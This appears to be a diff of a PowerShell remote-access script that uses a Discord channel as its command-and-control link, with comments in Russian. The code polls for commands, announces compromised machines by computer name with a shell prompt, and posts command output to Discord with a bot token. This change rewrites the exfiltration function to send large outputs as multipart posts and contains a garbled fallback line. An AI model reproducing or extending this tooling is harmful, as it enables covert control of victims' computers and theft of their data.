@@ -77,32 +77,40 @@ function PullMsg {
 
 function sendMsg {
     param([string]$Message)
-    $dir = $PWD.Path
+
+    if (-not $Message) { $Message = " " }
+
+    # Принудительно UTF-8 + убираем нулевые байты
+    $Message = [System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($Message))
+
+    # Экранируем обратные кавычки (чтобы не ломался markdown)
+    $Message = $Message -replace '`', 'ˋ'
+
     $url = "https://discord.com/api/v9/channels/$chan/messages"
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", "Bot $token")
-    if ($Message) {
-            $jsonBody = @{
-                "content" = "$Message"
-                "username" = "$dir"
-            } | ConvertTo-Json
-            $webClient.Headers.Add("Content-Type", "application/json")
-            $response = $webClient.UploadString($url, "POST", $jsonBody)
-            Write-Host "Message sent to Discord"
-        }
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`r`n"
+
+    $bodyLines = @()
+    $bodyLines += "--$boundary"
+    $bodyLines += 'Content-Disposition: form-data; name="payload_json"'
+    $bodyLines += ""
+    $payload = @{ content = $Message } | ConvertTo-Json -Compress
+    $bodyLines += $payload
+    $bodyLines += "--$boundary--"
+    $body = $bodyLines -join $LF
+
+    $headers = @{
+        "Authorization" = "Bot $token"
+        "Content-Type"  = "multipart/form-data; boundary=$boundary"
     }
 
-Function Authenticate{
-    if ($response -like "$env:COMPUTERNAME"){
-        $script:authenticated = 1
-        $script:previouscmd = $response
-        sendMsg -Message ":white_check_mark:  **$env:COMPUTERNAME** | ``Session Started!``  :white_check_mark:"
-        sendMsg -Message "``PS | $dir>``"
+    try {
+        Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body | Out-Null
+    } catch {
+        # Если всё равно 400 — отправляем просто как текст без markdown
+        $payload = @{ content = "```Ошибка отправки большого вывода```" } | ConvertTo-Json -Compress
+        Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body ("--$boundary$LFContent-Disposition: form-data; name=`"payload_json`"$LF$LF$payload$LF--$boundary--") | Out-Null
     }
-    else{
-        $script:authenticated = 0
-        $script:previouscmd = $response
-    } 
 }
 
 # =============================================================== MAIN LOOP =========================================================================
@@ -167,3 +175,4 @@ while ($true) {
     }
     sleep 5
 }
+
